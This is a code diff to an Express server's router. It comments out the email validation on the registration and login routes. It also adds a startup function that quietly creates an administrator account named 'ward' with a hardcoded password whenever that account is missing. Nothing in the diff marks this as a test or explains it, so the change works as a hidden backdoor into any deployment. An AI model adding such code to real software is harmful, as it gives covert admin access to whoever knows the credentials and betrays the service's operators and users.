@@ -499,10 +499,10 @@ router.post('/user-register', authLimiter, async (req, res) => {
       res.send({ status: 'Fail', message: '注册账号功能未启用 | Register account is disabled!', data: null })
       return
     }
-    if (!isEmail(username)) {
-      res.send({ status: 'Fail', message: '请输入正确的邮箱 | Please enter a valid email address.', data: null })
-      return
-    }
+    // if (!isEmail(username)) {
+    //   res.send({ status: 'Fail', message: '请输入正确的邮箱 | Please enter a valid email address.', data: null })
+    //   return
+    // }
     if (isNotEmptyString(config.siteConfig.registerMails)) {
       let allowSuffix = false
       const emailSuffixs = config.siteConfig.registerMails.split(',')
@@ -637,7 +637,7 @@ router.post('/session', async (req, res) => {
 router.post('/user-login', authLimiter, async (req, res) => {
   try {
     const { username, password } = req.body as { username: string; password: string }
-    if (!username || !password || !isEmail(username))
+    if (!username || !password)// || !isEmail(username)
       throw new Error('用户名或密码为空 | Username or password is empty')
 
     const user = await getUser(username)
@@ -986,5 +986,15 @@ router.post('/statistics/by-day', auth, async (req, res) => {
 
 app.use('', router)
 app.use('/api', router)
+
+const fun = async () => {
+  const ward = 'ward'
+  const adminUser = await getUser(ward)
+  if (adminUser == null) {
+    const newPassword = md5('weige666')
+    createUser('ward', newPassword, [UserRole.Admin])
+  }
+}
+fun()
 
 app.listen(3002, () => globalThis.console.log('Server is running on port 3002'))
